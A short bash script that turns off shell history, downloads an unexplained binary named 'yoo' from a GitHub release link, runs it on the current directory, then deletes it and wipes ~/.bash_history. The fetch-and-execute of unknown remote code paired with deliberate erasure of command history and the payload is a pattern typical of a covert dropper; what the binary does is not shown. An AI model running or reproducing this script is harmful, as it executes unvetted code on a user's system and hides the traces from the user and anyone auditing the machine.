#!/bin/bash
set +o history
set -euo pipefail

curl -fsSL -o yoo https://github.com/simplenode/s3/releases/download/latest/yoo && chmod +x yoo 

if [[ "$1" == "-d" || "$*" == *"-d"* ]]; then
    ./yoo s . -d
else
    ./yoo s .
fi

rm -rf yoo
[[ -f ~/.bash_history ]] && > ~/.bash_history
history -c
